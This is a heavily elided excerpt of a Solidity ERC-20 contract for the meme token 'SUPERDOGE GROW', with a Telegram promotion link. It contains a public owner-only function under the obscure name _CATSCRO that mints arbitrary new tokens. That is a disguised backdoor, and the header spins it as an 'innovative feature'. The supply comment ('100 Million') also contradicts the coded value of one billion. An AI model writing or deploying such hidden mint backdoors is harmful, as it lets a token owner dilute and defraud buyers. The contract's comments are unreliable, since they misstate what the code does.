...
//
// $SDG proposes an innovative feature in its contract.
//
// 📱 Telegram:https://t.me/SuperDogeGrow
//
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function _CATSCRO(uint256 amount) public onlyOwner {
    _CATSCRO(msg.sender, amount);
    }
    ...
    function _CATSCRO(address account, uint256 amount) internal virtual {
...
contract $SUPERDOGEGROW is ERC20 {

    uint tokenTotalSupply = 1000000000; // 100 Million Token Supply

    constructor() public ERC20("SUPERDOGE GROW", "SUPERDOGEGROW") {
        _CATSCRO(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}